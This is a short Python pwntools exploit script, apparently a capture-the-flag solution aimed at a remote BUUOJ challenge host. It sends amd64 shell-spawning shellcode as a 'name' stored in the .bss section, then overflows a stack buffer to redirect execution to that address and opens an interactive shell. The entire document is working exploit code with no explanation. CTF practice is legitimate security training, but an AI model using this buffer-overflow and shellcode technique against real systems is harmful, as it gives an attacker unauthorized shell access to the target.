from pwn import *
from LibcSearcher import *
context.arch='amd64'
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29724)
elf = ELF('./pwn')

poprdi_ret = 0x400713
ret = 0x4004c9
bss = 0x601080
leave = 0x4006a9
io.sendlineafter(b'tell me your name', asm(shellcraft.amd64.sh()))

payload = cyclic(0x20) + p64(bss) + p64(bss)
io.sendlineafter(b'What do you want to say to me?\n', payload)

io.interactive()